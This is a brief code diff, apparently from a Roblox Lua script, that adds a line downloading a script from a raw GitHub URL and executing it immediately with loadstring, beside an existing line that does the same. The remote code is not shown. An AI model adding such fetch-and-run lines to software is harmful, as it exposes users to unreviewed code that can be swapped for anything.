@@ -1044,5 +1044,5 @@ do
         Check(Player)
     end)
 end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yuvic123/announcement/refs/heads/main/Cc"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/YuvicHaha/ui3/refs/heads/main/checker"))()
